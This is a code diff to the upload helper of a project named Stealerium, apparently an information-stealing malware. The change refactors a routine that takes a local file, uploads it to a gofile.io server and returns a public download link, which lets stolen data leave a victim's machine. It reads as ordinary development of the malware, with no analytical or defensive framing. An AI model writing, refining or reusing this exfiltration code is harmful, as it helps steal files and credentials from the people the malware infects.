@@ -1,9 +1,10 @@
 ﻿using System;
 using System.Collections.Generic;
+using System.IO;
 using System.Linq;
-using System.Net;
-using System.Text;
+using System.Net.Http;
 using System.Text.Json.Serialization;
+using System.Threading.Tasks;
 using Newtonsoft.Json;
 using Newtonsoft.Json.Linq;
 
@@ -13,31 +14,29 @@ namespace Stealerium.Helpers
     {
         private const string ServiceEndpoint = "https://{server}.gofile.io/";
 
-        public static string UploadFile(string file)
+        public static async Task<string> UploadFile(string file)
         {
-            var client = new WebClient();
-            var optimalServer = GetServer(client);
+            using (var client = new HttpClient())
+            {
+                var optimalServer = GetServer(client);
+                var endpoint = ServiceEndpoint.Replace("{server}", await optimalServer);
 
-            var endpoint = ServiceEndpoint.Replace("{server}", optimalServer);
+                var content = new MultipartFormDataContent();
+                content.Add(new StreamContent(File.OpenRead(file)), "file", Path.GetFileName(file));
 
+                var response = await client.PostAsync(endpoint + "uploadFile", content);
+                var responseBody = await response.Content.ReadAsStringAsync();
+                var rawJson = JObject.Parse(responseBody);
+                var d = JsonConvert.SerializeObject(rawJson);
+                var output = JsonConvert.DeserializeObject<ApiResponse>(d);
 
-            var request =
-                client.UploadFile(
-                    endpoint +
-                    "uploadFile",
-                    file);
-
-            var responseBody = Encoding.ASCII.GetString(request);
-            var rawJson = JObject.Parse(responseBody);
-            var d = JsonConvert.SerializeObject(rawJson);
-            var output = JsonConvert.DeserializeObject<ApiResponse>(d);
-
-            return output.Data["downloadPage"].ToString();
+                return output.Data["downloadPage"].ToString();
+            }
         }
 
-        private static string GetServer(WebClient client)
+        private static async Task<string> GetServer(HttpClient client)
         {
-            var request = client.DownloadString(ServiceEndpoint.Replace("{server}", "apiv2") + "getServer");
+            var request = await client.GetStringAsync(ServiceEndpoint.Replace("{server}", "apiv2") + "getServer");
             var output = JObject.Parse(request);
             var d = JsonConvert.SerializeObject(output);
             var serverStatus = JsonConvert.DeserializeObject<ApiResponse>(d);
@@ -50,9 +49,10 @@ namespace Stealerium.Helpers
     }
 
     /// <summary>
-    /// Data class for the gofile.io api v2
-    /// example: {"status":"ok","data":{"server":"store1"}}
-    /// example: {"status":"ok","data":{"code":"123Abc","adminCode":"3ZcBq12nrYu4cbSwJVYY","file":{"name":"file.txt", [...]}}}
+    ///     Data class for the gofile.io api v2
+    ///     example: {"status":"ok","data":{"server":"store1"}}
+    ///     example: {"status":"ok","data":{"code":"123Abc","adminCode":"3ZcBq12nrYu4cbSwJVYY","file":{"name":"file.txt",
+    ///     [...]}}}
     /// </summary>
     public class ApiResponse
     {
